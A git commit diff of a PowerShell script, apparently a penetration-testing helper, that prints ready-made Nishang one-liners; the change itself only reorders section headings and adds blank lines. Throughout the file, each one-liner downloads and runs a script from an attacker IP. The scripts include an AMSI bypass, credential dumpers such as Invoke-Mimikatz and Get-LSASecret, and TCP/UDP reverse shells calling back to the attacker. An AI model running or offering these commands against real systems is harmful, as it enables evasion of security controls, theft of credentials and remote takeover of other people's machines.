dfae40e6994d0c77c36c0a57815977ad92a32a0a
ViperOne <68926315+The-Viper-One@users.noreply.github.com>
2021-10-25 15:19:04 -0400

    Update Nishang-Generator.ps1

--- Nishang-Generator.ps1
+++ Nishang-Generator.ps1
@@ -2,12 +2,14 @@ $TargetIP = "10.10.10.10"
 $TargetPort = ""
 $AttackerIP = "10.10.10.16"
 $AttackerPort = "443"
-
 $ExecutionArrayBypass = @(
+
+
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Bypass/Invoke-AmsiBypass.ps1`"); Invoke-AmsiBypass"| Out-String
 )
 
 $ExecutionArrayGather = @(
+
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Copy-VSS.ps1`"); Copy-VSS -Destination <Destination>"| Out-String
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-Information.ps1`"); Get-Information"| Out-String
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-LSASecret.ps1`"); Get-LSASecret"| Out-String
@@ -19,19 +21,27 @@ $ExecutionArrayGather = @(
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Invoke-Mimikatz.ps1`"); Invoke-Mimikatz"| Out-String
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Invoke-Mimikittenz.ps1`"); Invoke-Mimikittenz"| Out-String
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Invoke-SessionGopher.ps1`"); Invoke-SessionGopher"| Out-String
+
+
 )
 
 $ExecutionArrayShells = @(
+
+
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Shells/Invoke-PowerShellTcp.ps1`"); Invoke-PowerShellTcp -Reverse -IPAddress $AttackerIP -Port $AttackerPort"| Out-String
 "iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Shells/Invoke-PowerShellUdp.ps1`"); Invoke-PowerShellUdp -Reverse -IPAddress $AttackerIP -Port $AttackerPort"| Out-String
+
 )
 
 Start-Sleep -Milliseconds '250'
-Write-Host "Shells" -ForegroundColor 'Yellow'
+Write-Host "Bypasses" -ForegroundColor 'Yellow'
 Write-Host $ExecutionArrayBypass
+
 Start-Sleep -Milliseconds '250'
 Write-Host "Gather Scripts" -ForegroundColor 'Yellow'
 Write-Host $ExecutionArrayGather
+
 Start-Sleep -Milliseconds '250'
-Write-Host "Bypasses" -ForegroundColor 'Yellow'
+Write-Host "Shells" -ForegroundColor 'Yellow'
 Write-Host $ExecutionArrayShells
+
